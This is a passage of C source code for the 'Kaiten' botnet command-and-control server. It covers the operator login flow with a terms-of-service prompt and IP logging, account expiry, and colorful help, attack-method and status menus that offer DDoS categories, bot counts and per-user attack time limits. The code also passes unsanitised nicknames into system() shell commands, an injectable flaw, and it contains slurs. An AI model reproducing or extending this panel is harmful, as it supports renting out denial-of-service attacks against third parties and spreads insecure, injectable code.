        sprintf(login11, "\e[38;2;255;0;211m                  ║-If I break any of t\e[38;2;227;27;216mhese r\e[38;2;199;53;221mules I\e[38;2;171;80;226m will \e[38;2;143;106;231mget ba\e[38;2;116;133;235mnned.║\x1b[0m\r\n");
        sprintf(login12, "\e[38;2;255;0;211m                  ╚═════════════════╦═══\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m╦═════\e[38;2;143;106;231m══════\e[38;2;116;133;235m════╝\x1b[0m\r\n");
        sprintf(login13, "\e[38;2;255;0;211m Instagram: @ft.faygo - Komodo      ║ Do \e[38;2;227;27;216mYou Ag\e[38;2;199;53;221mree? ║\x1b[0m\r\n");
        sprintf(login14, "\e[38;2;255;0;211m Instagram: @11xrvt   - Tiger       ╚═════\e[38;2;227;27;216m══════\e[38;2;199;53;221m════╝\x1b[0m\r\n");
        sprintf(login15, "\e[38;2;255;0;211m                                    ╔═════╗\e[38;2;227;27;216m  ╔═══\e[38;2;199;53;221m══╗\x1b[0m\r\n");
        sprintf(login16, "\e[38;2;255;0;211m                                    ║ yes.║ \e[38;2;227;27;216m ║ no.\e[38;2;199;53;221m ║\x1b[0m\r\n");
        sprintf(login17, "\e[38;2;255;0;211m                                    ╚═════╝  \e[38;2;227;27;216m╚═════\e[38;2;199;53;221m╝\x1b[0m\r\n");
        
        if(send(datafd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login1, strlen(login1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login2, strlen(login2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login3, strlen(login3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login4, strlen(login4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, login5, strlen(login5), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login6, strlen(login6), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login7, strlen(login7), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login8, strlen(login8), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login9, strlen(login9), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login10, strlen(login10), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login11, strlen(login11), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login12, strlen(login12), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login13, strlen(login13), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login14, strlen(login14), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login15, strlen(login15), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login16, strlen(login16), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, login17, strlen(login17), MSG_NOSIGNAL) == -1) goto end;

			sprintf(usethis, "\r\n \e[1;35mDo You Agree? [\e[1;32mYes \e[1;35mor \e[1;31mNo\e[1;35m]:\033[97m");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0,sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) > 1);
			trim(buf);

			if(strcasestr(buf, "Yes") || strcasestr(buf, "yes"))
			{
				int check = 0;
				char checkingtos[800];
				char sendtos[8000];
				char checkinglog[800];
				char log1[800];
				sprintf(sendtos, "echo '%s Accepted TOS!' >> logs/AcceptedTos.txt", nickstring);
				sprintf(checkingtos, "%s Accepted TOS!", nickstring);
				sprintf(log1, "echo '%s IP: %s' >> logs/LoggedUsers.txt", nickstring, ipinfo);
				sprintf(checkinglog, "%s IP: %s", nickstring, ipinfo);

				char *line3 = NULL;
        		size_t n3 = 0;
        		FILE *f3 = fopen("logs/AcceptedTos.txt", "r");
        		    while (getline(&line3, &n3, f3) != -1)
        		    {
        		        if (strstr(line2, checkingtos) != NULL){
        		        check = 1;
        		        //nothing
        		    } 
        		}
        		fclose(f3);
        		free(line3);
        		if(check == 0)
        		{
        			system(sendtos);
        			system(log1);
        		}
				usleep(250000);
				loggedin = 0;
				memset(nickstring, 0, sizeof(nickstring));
				goto Banner;
			} else 
			{
				sprintf(usethis, "\e[1;37mYou Didnt Accept TOS! You may not enter to Kaiten K-Bot\r\n");
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				goto end;
			}

            }
        }

            failed:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			sprintf(usethis, "\e[1;37m Failed Login, Your IP Has Now Been Logged And Sent To [kaiten@nigge.rs]\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			sleep(3);
        	goto end;

        Banner:

        strcpy(accounts[datafd].expirydate, accounts[find_line].expirydate);
        if(check_expiry(datafd) == 1)
        {
            sprintf(clearscreen, "\033[2J\033[1;1H");    
            if(send(datafd, clearscreen,  strlen(clearscreen),    MSG_NOSIGNAL) == -1) goto end;
            send(datafd, "\e[1;36mAccount Has Expired, Message Komodo\r\n", strlen("\e[1;36mAccount Has Expired, Message Komodo\r\n"), MSG_NOSIGNAL); // now
            printf("[Kaiten]:%s's Account Has Expired\r\n", accounts[find_line].username);
            sleep(5);
            goto end;
        }
        gay[datafd].login = 0;
        pthread_t timeloggedin;
		pthread_create(&title, NULL, &TitleWriter, sock);
		        char banner0   [2400];
		        char banner1   [2400];
		        char banner2   [2400];
		        char banner3   [2400];
		        char banner4   [2400];
		        char banner5   [2400];
		        char banner6   [2400];
		        char banner7   [2400];
		        char banner8   [2400];
		        char banner9   [2400];
		        char banner10  [2400];
		        char banner11  [2400];
		        char *userlog  [1200];

 				char hostbuffer[256]; 
    			int hostname; 
    			hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
    			checkHostName(hostname); 
 				if(!strcmp(accounts[find_line].admin, "admin")) 
 				{
 					managements[datafd].adminstatus = 1;
 				} else {
 					pthread_create(&timeloggedin, NULL, &timeconnected, sock);
 				}

                char clearscreen1 [2048];
				memset(clearscreen1, 0, 2048);
				sprintf(clearscreen1, "\033[2J\033[1;1H");	
				sprintf(managements[datafd].my_ip, "%s", ipinfo);
				sprintf(managements[datafd].id, "%s", accounts[find_line].username);
				sprintf(managements[datafd].planname, "%s", accounts[find_line].admin);
				managements[datafd].mycooldown = accounts[find_line].cooldown;
				managements[datafd].mymaxtime = accounts[find_line].maxtime;

				int loginshit;
				for(loginshit=0;loginshit<MAXFDS;loginshit++)
				{
					if(gay[datafd].just_logged_in == 0 && managements[loginshit].LoginListen == 1 && managements[loginshit].connected == 1 && loggedin == 0)
					{
						sprintf(usethis, "\r\n%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						printf(usethis, "[Kaiten]:%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[loginshit].id);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						gay[datafd].just_logged_in = 3;
					}
				}
				memset(ipinfo, 0, sizeof(ipinfo));	
			
				

	    sprintf(banner0,  "\e[1;37mMOTD: %s\r\n", motd); 
        sprintf(banner1, "\e[1;38;2;227;27;216m[̲ ̲𝙺̲𝚊̲𝚒̲𝚝̲𝚎̲𝚗̲ ̲𝙲̲𝟸̲ ̲𝙰̲ ̲𝚂̲𝚘̲𝚞̲𝚛̲𝚌̲𝚎̲ ̲𝙲̲𝚘̲𝚍̲𝚎̲𝚍̲ ̲𝙱̲𝚢̲ ̲𝙺̲𝚘̲𝚖̲𝚘̲𝚍̲𝚘̲ ̲]͢                                                         \r\n");   
        sprintf(banner2, "\e[38;2;255;0;211m                  ██╗  ██╗\e[38;2;227;27;216m █████╗ \e[38;2;199;53;221m██╗\e[38;2;171;80;226m████████╗\e[38;2;143;106;231m███████╗\e[38;2;116;133;235m███╗   ██╗\r\n");
        sprintf(banner3, "\e[38;2;255;0;211m                  ██║ ██╔╝\e[38;2;227;27;216m██╔══██╗\e[38;2;199;53;221m██║\e[38;2;171;80;226m╚══██╔══╝\e[38;2;143;106;231m██╔════╝\e[38;2;116;133;235m████╗  ██║\r\n");
        sprintf(banner4, "\e[38;2;255;0;211m                  █████╔╝ \e[38;2;227;27;216m███████║\e[38;2;199;53;221m██║\e[38;2;171;80;226m   ██║   \e[38;2;143;106;231m█████╗  \e[38;2;116;133;235m██╔██╗ ██║\r\n");
        sprintf(banner5, "\e[38;2;255;0;211m                  ██╔═██╗ \e[38;2;227;27;216m██╔══██║\e[38;2;199;53;221m██║\e[38;2;171;80;226m   ██║   \e[38;2;143;106;231m██╔══╝  \e[38;2;116;133;235m██║╚██╗██║\r\n");
        sprintf(banner6, "\e[38;2;255;0;211m                  ██║  ██╗\e[38;2;227;27;216m██║  ██║\e[38;2;199;53;221m██║\e[38;2;171;80;226m   ██║   \e[38;2;143;106;231m███████╗\e[38;2;116;133;235m██║ ╚████║\r\n");
        sprintf(banner7, "\e[38;2;255;0;211m                  ╚═╝  ╚═╝\e[38;2;227;27;216m╚═╝  ╚═╝\e[38;2;199;53;221m╚═╝\e[38;2;171;80;226m   ╚═╝   \e[38;2;143;106;231m╚══════╝\e[38;2;116;133;235m╚═╝  ╚═══╝\e[1;31m𝓚-𝓑𝓸𝓽 𝓥2\r\n");
        sprintf(banner8, "\e[38;2;255;0;211m                ╔═══════════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m══════╗\r\n");
        sprintf(banner9, "\e[38;2;255;0;211m                ║       Welco\e[38;2;227;27;216mme To \e[38;2;199;53;221mThe Of\e[38;2;171;80;226mficial\e[38;2;143;106;231m Kaite\e[38;2;116;133;235mn K-BO\e[38;2;88;159;240mT    ║\r\n"); 
        sprintf(banner10,"\e[38;2;255;0;211m                ║            T\e[38;2;227;27;216mype 'H\e[38;2;199;53;221melp' F\e[38;2;171;80;226mor Com\e[38;2;143;106;231mmands.\e[38;2;116;133;235m      \e[38;2;88;159;240m    ║\r\n");
        sprintf(banner11,"\e[38;2;255;0;211m                ╚══════════════\e[38;2;227;27;216m══════\e[38;2;199;53;221m══════\e[38;2;171;80;226m══════\e[38;2;143;106;231m══════\e[38;2;116;133;235m══════\e[38;2;88;159;240m═══╝\r\n");

				if(send(datafd, clearscreen1,  strlen(clearscreen1),	MSG_NOSIGNAL) == -1) goto end;
				if(strlen(motd) > 1){
					if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
				}
				if(motdaction == 1)
				{
					if(send(datafd, banner0, strlen(banner0), MSG_NOSIGNAL) == -1) goto end;
				}


           
		while(1) {
		char input [5000]; // \e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m
        sprintf(input, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", managements[datafd].id);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   

      		if(strcasestr(buf, "help") || strcasestr(buf, "Help")) 
      		{
					pthread_create(&title, NULL, &TitleWriter, sock);
	  				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);	
	  				if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;		
	  				if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  				if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

	    char hp1  [800];
		char hp2  [800];
        char hp3  [800];
        char hp4  [800];
        char hp5  [800];
        char hp6  [800];
        char hp7  [800];
        char hp8  [800];
        char hp9  [800];
        char hp10  [800];               
        char hp11  [800];
        char hp12  [800];
        char hp13  [800];
        char hp14  [800];


                              //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                sprintf(hp1,   "\e[38;2;255;0;211m        ╔══\e[38;2;227;27;216m═══\e[38;2;199;53;221m═══\e[38;2;171;80;226m═══\e[38;2;143;106;231m═══\e[38;2;116;133;235m═══\e[38;2;88;159;240m═══════╗╔════════════════╗\r\n");
                sprintf(hp2,   "\e[38;2;255;0;211m        ║  W\e[38;2;227;27;216melc\e[38;2;199;53;221mome\e[38;2;171;80;226m To\e[38;2;143;106;231m Ka\e[38;2;116;133;235mite\e[38;2;88;159;240mn C2  ╠╣ Main Help Menu ║\r\n");
                sprintf(hp3,   "\e[38;2;255;0;211m        ╚════\e[38;2;227;27;216m═══\e[38;2;199;53;221m═══\e[38;2;171;80;226m═══\e[38;2;143;106;231m═══\e[38;2;116;133;235m═══\e[38;2;88;159;240m═════╝╚════════════════╝\r\n");
                sprintf(hp4,   "\e[38;2;255;0;211m     ╔════\e[38;2;227;27;216m═════\e[38;2;199;53;221m═════\e[38;2;171;80;226m═════\e[38;2;143;106;231m═════\e[38;2;116;133;235m═════\e[38;2;88;159;240m═════════╗\e[1;37m╔═══════════════╗ \r\n");
                sprintf(hp5,   "\e[38;2;255;0;211m     ║METHO\e[38;2;227;27;216mDS - \e[38;2;199;53;221mShows\e[38;2;171;80;226m All \e[38;2;143;106;231mMetho\e[38;2;116;133;235md Cat\e[38;2;88;159;240mogries  ║\e[1;37m Username: \e[1;35m%s      \r\n", managements[datafd].id);
                sprintf(hp6,   "\e[38;2;255;0;211m     ║PLANS \e[38;2;227;27;216m  - S\e[38;2;199;53;221mhows \e[38;2;171;80;226mAll K\e[38;2;143;106;231maiten\e[38;2;116;133;235m Plan\e[38;2;88;159;240ms      ║\e[1;37m Maxtime: \e[1;35m%d         \r\n", managements[datafd].mymaxtime);
                sprintf(hp7,   "\e[38;2;255;0;211m     ║RULES  \e[38;2;227;27;216m - Sh\e[38;2;199;53;221mows A\e[38;2;171;80;226mll Th\e[38;2;143;106;231me Rul\e[38;2;116;133;235mes   \e[38;2;88;159;240m      ║\e[1;37m Cooldown: \e[1;35m%d        \r\n", managements[datafd].mycooldown);  
                sprintf(hp8,   "\e[38;2;255;0;211m     ║MEDIA   \e[38;2;227;27;216m- Sho\e[38;2;199;53;221mws Ka\e[38;2;171;80;226miten \e[38;2;143;106;231mStaff\e[38;2;116;133;235m Soci\e[38;2;88;159;240mals  ║\e[1;37m Plan: \e[1;35m%s            \r\n", managements[datafd].planname);       
                sprintf(hp9,   "\e[38;2;255;0;211m     ║BOTS    -\e[38;2;227;27;216m Show\e[38;2;199;53;221ms The\e[38;2;171;80;226m Bot/\e[38;2;143;106;231mRoot \e[38;2;116;133;235mCount\e[38;2;88;159;240m    ║\e[1;37m╚═══════════════╝\r\n");
                sprintf(hp10,  "\e[38;2;255;0;211m     ║STATUS  - \e[38;2;227;27;216mShows\e[38;2;199;53;221m The \e[38;2;171;80;226mBotne\e[38;2;143;106;231mt Sta\e[38;2;116;133;235mtus  \e[38;2;88;159;240m   ║\e[1;37m╔═══════════════╗ \r\n");
                sprintf(hp11,  "\e[38;2;255;0;211m     ║HIS     - S\e[38;2;227;27;216mhows \e[38;2;199;53;221mA Fun\e[38;2;171;80;226m Litt\e[38;2;143;106;231mle Te\e[38;2;116;133;235mxt :)\e[38;2;88;159;240m  ║\e[1;37m║OVH(s): \e[1;32mOnline\e[1;37m.║ \r\n");
                sprintf(hp12,  "\e[38;2;255;0;211m     ║ADMIN   - Sh\e[38;2;227;27;216mows A\e[38;2;199;53;221mll Ad\e[38;2;171;80;226mmin C\e[38;2;143;106;231momman\e[38;2;116;133;235mds   \e[38;2;88;159;240m ║\e[1;37m║NFO(s): \e[1;32mOnline\e[1;37m.║ \r\n");
                sprintf(hp13,  "\e[38;2;255;0;211m     ║MORE    - Sho\e[38;2;227;27;216mws Mo\e[38;2;199;53;221mre Co\e[38;2;171;80;226mmmand\e[38;2;143;106;231ms    \e[38;2;116;133;235m     \e[38;2;88;159;240m║\e[1;37m║100UP:  \e[1;32mOnline\e[1;37m.║ \r\n");
                sprintf(hp14,  "\e[38;2;255;0;211m     ╚══════════════\e[38;2;227;27;216m═════\e[38;2;199;53;221m═════\e[38;2;171;80;226m═════\e[38;2;143;106;231m═════\e[38;2;116;133;235m════╝\e[1;37m╚═══════════════╝\r\n");

        if(send(datafd, hp1,  strlen(hp1),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp2,  strlen(hp2),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp3,  strlen(hp3),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp4,  strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp5,  strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp6,  strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp7,  strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp8,  strlen(hp8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp9,  strlen(hp9),  MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp10,  strlen(hp10), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp11,  strlen(hp11), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp12,  strlen(hp12), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp13,  strlen(hp13), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, hp14,  strlen(hp14), MSG_NOSIGNAL) == -1) goto end;
					pthread_create(&title, NULL, &TitleWriter, sock);
					char input [5000];
        			sprintf(input, "\r\n\e[1;35m%s@\e[1;36m[Kaiten]:\e[1;37m", accounts[find_line].username);
					if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto Banner;
							continue;
 			}

 			if(strcasestr(buf, "testing"))
 			{
 				int i;
 				for(i=0;i < attacksrunning;i++){
 					sprintf(usethis, "%s: %s IP: %s Port: %s Time: %d Time Left: %s", Sending[i].username, Sending[i].method, Sending[i].ip, Sending[i].attacktime, Sending[i].attacktimeleft);
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				}
 			}

 			if(strcasestr(buf, "METHODS") || strstr(buf, "Methods") || strstr(buf, "methods") || strstr(buf, "MethoDs") || strstr(buf, "MeThOdS") || strstr(buf, "mEthodS"))
 			{
				pthread_create(&title, NULL, &TitleWriter, sock);
	    	    send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);	
	    	    if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;			
	    	    if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	    	    if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	    	    if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;
	  	
        char p1  [800];
        char p2  [800];                      //   \e[1;35m 
        char p3  [800];                      //   \e[1;36m
        char p4  [800];
        char p5  [800];
        char p6  [800];                      //   \e[38;2;88;159;240m
        char p7  [800];
        char p8  [800];
                char p9  [800];
                char p10  [800];   
				char disabled1[800];
				char disabled2[800];
				char disabled3[800];

				                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m
				
sprintf(p1,   "\e[38;2;255;0;211m┌──────────\e[38;2;227;27;216m┬─────────\e[38;2;199;53;221m┐┌──────\e[38;2;171;80;226m┐┌──────\e[38;2;143;106;231m─┬──────\e[38;2;116;133;235m───\e[38;2;88;159;240m─┐ \r\n");
sprintf(p2,   "\e[38;2;255;0;211m│ STANDARD \e[38;2;227;27;216m│ SPECIAL \e[38;2;199;53;221m││ GAME \e[38;2;171;80;226m││ EXTRA\e[38;2;143;106;231m │ EXPLO\e[38;2;116;133;235mITS\e[38;2;88;159;240m │ \r\n");
sprintf(p3,   "\e[38;2;255;0;211m└──────────\e[38;2;227;27;216m┴─────────\e[38;2;199;53;221m┘└──────\e[38;2;171;80;226m┘└──────\e[38;2;143;106;231m─┴──────\e[38;2;116;133;235m───\e[38;2;88;159;240m─┘ \r\n");
sprintf(p4,   "\e[38;2;255;0;211m┌────────\e[38;2;227;27;216m┬─────────\e[38;2;199;53;221m┐┌─────\e[38;2;171;80;226m┐┌────┬─\e[38;2;143;106;231m─────┐ ┌\e[38;2;116;133;235m────────\e[38;2;88;159;240m─┐ \r\n");  
sprintf(p5,   "\e[38;2;255;0;211m│ BYPASS \e[38;2;227;27;216m│ SERVER  \e[38;2;199;53;221m││ API \e[38;2;171;80;226m││ L7 │ \e[38;2;143;106;231mIPHM │ │\e[38;2;116;133;235m SCRIPTS\e[38;2;88;159;240m │\r\n");  
sprintf(p6,   "\e[38;2;255;0;211m└────────\e[38;2;227;27;216m┴─────────\e[38;2;199;53;221m┘└─────\e[38;2;171;80;226m┘└────┴─\e[38;2;143;106;231m─────┘ └\e[38;2;116;133;235m────────\e[38;2;88;159;240m─┘\r\n");  
sprintf(p7,   "\e[38;2;255;0;211m┌────\e[38;2;227;27;216m─────\e[38;2;199;53;221m─────\e[38;2;171;80;226m─────\e[38;2;143;106;231m─────\e[38;2;116;133;235m─────\e[38;2;88;159;240m──────────────────────────┐ \r\n");
sprintf(p8,   "\e[38;2;255;0;211m   Wel\e[38;2;227;27;216mcome \e[38;2;199;53;221m%s, P\e[38;2;171;80;226mlease\e[38;2;143;106;231m Sele\e[38;2;116;133;235mct By\e[38;2;88;159;240m Typing The Name        \r\n", managements[datafd].id);
sprintf(p9,   "\e[38;2;255;0;211m└──────\e[38;2;227;27;216m─────\e[38;2;199;53;221m─────\e[38;2;171;80;226m─────\e[38;2;143;106;231m─────\e[38;2;116;133;235m─────\e[38;2;88;159;240m────────────────────────┘ \r\n");
sprintf(p10,  "\e[1;37m[\e[1;35mYour Maxtime\e[1;37m]\e[1;35m: \e[1;36m(\e[1;37m%d\e[1;36m)                            \r\n", managements[datafd].mymaxtime);

        	    sprintf(disabled1, "              \e[1;37m======================================================\r\n");
        	    sprintf(disabled2, "              \e[1;37m[+]Attacks Are Currently \e[1;31mDisabled \e[1;37mPlease Try Later.[+]  \r\n");
        	    sprintf(disabled3, "              \e[1;37m======================================================\r\n");

	  			if(AttackStatus == 0)
	  			{
        if(send(datafd, p1,  strlen(p1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p2,  strlen(p2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p3,  strlen(p3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p4,  strlen(p4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p5,  strlen(p5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p6,  strlen(p6), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p7,  strlen(p7), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p8,  strlen(p8), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p9,  strlen(p9), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, p10,  strlen(p10), MSG_NOSIGNAL) == -1) goto end;
	  			} else {
	  				if(send(datafd, disabled1, strlen(disabled1), MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, disabled2, strlen(disabled2), MSG_NOSIGNAL) == -1) goto end;
	  				if(send(datafd, disabled3, strlen(disabled3), MSG_NOSIGNAL) == -1) goto end;
	  			}
	
	
					pthread_create(&title, NULL, &TitleWriter, sock);
			}

			        if(strstr(buf, "STAT") || strstr(buf, "STATS") || strstr(buf, "STATUS") || strstr(buf, "stats") || strstr(buf, "stat") || strstr(buf, "status")) 
			        {

        send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
        if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;			
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end; 
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner6,  strlen(banner6),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner7,  strlen(banner7),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner8,  strlen(banner8),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner9,  strlen(banner9),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner10,  strlen(banner10),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner11,  strlen(banner11),	MSG_NOSIGNAL) == -1) goto end;

        char p2  [800];
        char p3  [800];
        char p4  [800];
        char p5  [800];
        char p6  [800];
        char p7  [800];
        char p8  [800];
        char p9  [800];
        char p10  [800];
        char p11  [800];
        char p12  [800];
        char p13  [800];

                //    \e[38;2;255;0;211m

        //    \e[38;2;227;27;216m

        //    \e[38;2;199;53;221m

        //    \e[38;2;171;80;226m

        //    \e[38;2;143;106;231m

        //    \e[38;2;116;133;235m

        //    \e[38;2;88;159;240m

                sprintf(p2,   "\e[38;2;255;0;211m╔═\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m═══════\e[38;2;143;106;231m═══════\e[38;2;116;133;235m═╗                                      \r\n");
                sprintf(p3,   "\e[38;2;255;0;211m║  \e[38;2;227;27;216m   Kaite\e[38;2;199;53;221mn Backe\e[38;2;171;80;226mnd Syst\e[38;2;143;106;231mem     \e[38;2;116;133;235m╠══> Status : \e[1;32mRunning.                  \r\n");
                sprintf(p4,   "\e[38;2;255;0;211m╚═══\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m═══════\e[38;2;143;106;231m══════╝                                      \r\n");
                sprintf(p5,   "\e[38;2;255;0;211m╔════\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m═══════\e[38;2;143;106;231m═════╗\e[38;2;116;133;235m                                      \r\n");
                sprintf(p6,   "\e[38;2;255;0;211m║     \e[38;2;227;27;216m  Kaiten\e[38;2;199;53;221m Safe M\e[38;2;171;80;226mode    \e[38;2;143;106;231m    ╠═\e[38;2;116;133;235m═> Status : \e[1;32mRunning.                  \r\n");
                sprintf(p7,   "\e[38;2;255;0;211m╚══════\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m═══════\e[38;2;143;106;231m═══╝                                      \r\n");
                sprintf(p8,   "\e[38;2;255;0;211m╔═══════\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m═══════\e[38;2;143;106;231m══╗                                      \r\n");
                sprintf(p9,   "\e[38;2;255;0;211m║        \e[38;2;227;27;216m Api Ser\e[38;2;199;53;221mver One\e[38;2;171;80;226m       \e[38;2;143;106;231m ╠══\e[38;2;116;133;235m> Status : \e[1;32mRunning.                  \r\n");
                sprintf(p10,  "\e[38;2;255;0;211m╚═════════\e[38;2;227;27;216m════════\e[38;2;199;53;221m═══════\e[38;2;171;80;226m═══════\e[38;2;143;106;231m╝                                      \r\n");
